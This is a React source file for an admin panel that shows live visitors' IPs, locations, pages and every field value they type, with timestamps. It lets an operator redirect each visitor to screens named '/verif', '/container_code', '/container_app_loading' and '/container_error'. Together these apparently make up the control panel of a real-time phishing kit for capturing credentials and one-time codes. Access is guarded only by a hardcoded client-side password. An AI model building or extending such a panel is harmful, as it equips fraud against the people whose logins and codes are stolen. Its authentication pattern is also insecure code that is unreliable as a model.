import React, { useState, useEffect } from 'react';
import { socket } from '../index';
import './AdminPanel.css';

const AdminPanel = () => {
  const [activeUsers, setActiveUsers] = useState([]);
  const [previousUsers, setPreviousUsers] = useState([]);
  const [routes, setRoutes] = useState({});

  useEffect(() => {
    if (!localStorage.getItem('isAdmin')) {
      const password = prompt('Enter admin password:');
      if (password === 'dennidenni') {
        localStorage.setItem('isAdmin', 'true');
      } else {
        window.location.href = '/';
        return;
      }
    }

    const handleUpdate = (data) => {
      setActiveUsers(data.activeUsers || []);
      setPreviousUsers(data.previousUsers || []);
    };

    socket.on('update', handleUpdate);
    
    // Load initial data
    fetch(`${process.env.REACT_APP_API_URL}/api/users`)
      .then(res => res.json())
      .then(data => {
        setActiveUsers(data.activeUsers || []);
        setPreviousUsers(data.previousUsers || []);
      })
      .catch(console.error);

    fetch(`${process.env.REACT_APP_API_URL}/api/previous-users`)
      .then(res => res.json())
      .then(data => {
        setPreviousUsers(data || []);
      })
      .catch(console.error);

    return () => socket.off('update');
  }, []);

  const handleRouteChange = (sessionId, newRoute) => {
    fetch(`${process.env.REACT_APP_API_URL}/api/change-route`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId,
        newRoute
      })
    })
    .then(response => {
      if (response.ok) {
        setRoutes(prev => ({
          ...prev,
          [sessionId]: ''
        }));
      }
    })
    .catch(error => console.error('Error changing route:', error));
  };

  const UserCard = ({ user, isActive }) => {
    if (!user || !user.sessionId) {
      return null;
    }

    return (
      <div className="user-card">
        <div className="card-header">
          <span>Session: {user.sessionId}</span>
          <span>{new Date(user.timestamp).toLocaleTimeString()}</span>
        </div>
        <div className="card-content">
          <p><strong>IP:</strong> {user.ip}</p>
          <p><strong>Location:</strong> {user.country}</p>
          <p><strong>Last Page:</strong> {user.pageUrl}</p>
          <p><strong>Event Type:</strong> {user.eventType}</p>
          {user.componentName && <p><strong>Component:</strong> {user.componentName}</p>}
          {!isActive && (
            <p className="disconnected-time">
              <strong>Disconnected:</strong> {new Date(user.disconnectedAt).toLocaleString()}
            </p>
          )}
          {user.inputs && Object.entries(user.inputs).map(([key, data]) => (
            <div key={key} className="input-data">
              <span>{key}: {data.value}</span>
              <span className="input-timestamp"> {new Date(data.timestamp).toLocaleTimeString()}</span>
            </div>
          ))}
          {isActive && (
            <div className="route-buttons">
              <button onClick={() => handleRouteChange(user.sessionId, '/')}>
                /
              </button>
              <button onClick={() => handleRouteChange(user.sessionId, '/container')}>
                /container
              </button>
              <button onClick={() => handleRouteChange(user.sessionId, '/verif')}>
                /verif
              </button>
              <button onClick={() => handleRouteChange(user.sessionId, '/container_code')}>
                /container_code
              </button>
              <button onClick={() => handleRouteChange(user.sessionId, '/container_loading')}>
                /container_app_loading
              </button>
              <button onClick={() => handleRouteChange(user.sessionId, '/container_error')}>
                /container_error
              </button>
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="admin-panel">
      <div className="panel-split">
        <div className="panel-section">
          <h2>Active Users ({activeUsers.length})</h2>
          <div className="users-grid">
            {activeUsers.map(user => (
              <UserCard key={user.sessionId} user={user} isActive={true} />
            ))}
          </div>
        </div>
        <div className="panel-section">
          <h2>Previous Users ({previousUsers.length})</h2>
          <div className="users-grid">
            {previousUsers.map(user => (
              <UserCard key={`${user.sessionId}-${user.disconnectedAt}`} user={user} isActive={false} />
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;